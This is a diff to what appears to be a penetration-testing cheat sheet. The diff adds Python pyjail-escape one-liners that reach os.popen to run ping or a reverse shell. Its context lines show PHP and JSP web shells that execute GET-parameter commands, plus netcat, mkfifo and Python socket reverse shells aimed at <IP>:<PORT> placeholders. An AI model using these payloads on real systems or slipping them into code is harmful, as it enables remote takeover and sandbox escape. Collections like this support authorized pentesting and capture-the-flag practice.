@@ -23,11 +23,15 @@ tcpdump -i <INTERFACE> icmp
 On target, make ICMP `echo` requests using ping in **background** to prevent
 shell lose in case of blocked ping:
 
-```bash
-ping -c 4 <IP> &
 ```
-```python
-python -c 'import os;  os.popen("ping -c 4 <IP> &");"
+ping -c 2 <IP> &
+
+python -c 'import os;  os.popen("ping -c 2 <IP> &");"
+python -c 'import os;  os.popen("ping -n 2 <IP> &");"
+
+# Python in a pyjail  
+[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('ping -c 2 <IP>').read()
+[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('ping -n 2 <IP>').read()
 ```
 
 ### Web shells
@@ -58,7 +62,7 @@ Kali Linux also comes with a *smaller* collection of web shell, located in:
 `JSP` one-liner without output to execute system commands through GET
 parameters:
 
-```jsp
+```
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
 
@@ -80,7 +84,7 @@ javascript:{window.localStorage.embed=window.atob("ZG9jdW1lbnQud3JpdGUoIjxwPiIpO
 
 Basic PHP code to execute system commands through GET parameters:
 
-```php
+```PHP
 <?php if($_GET['cmd']) { system($_GET['cmd']); } ?>
 <?php if($_GET['cmd']) { exec($_GET['cmd'],$array); print_r($array); } ?>
 <?php if($_GET['cmd']) { echo shell_exec($_GET['cmd']); } ?>
@@ -252,6 +256,9 @@ python -c 'import os;  os.popen("nc -e /bin/sh <IP> <PORT> &");'
 python -c 'import os;  os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f &");'
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+# From a PyJail
+[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('<REVERSE_SHELL>').read()
 ```
 
 ###### PHP   
@@ -388,7 +395,7 @@ If reverse shell must be made through a binary the following c code can be used:
 #include <stdlib.h>
 
 int main() {
-	system("<SHELLCODE_ONELINER");
+	system("<SHELLCODE_ONELINER>");
 	return 0;
 }
 ```
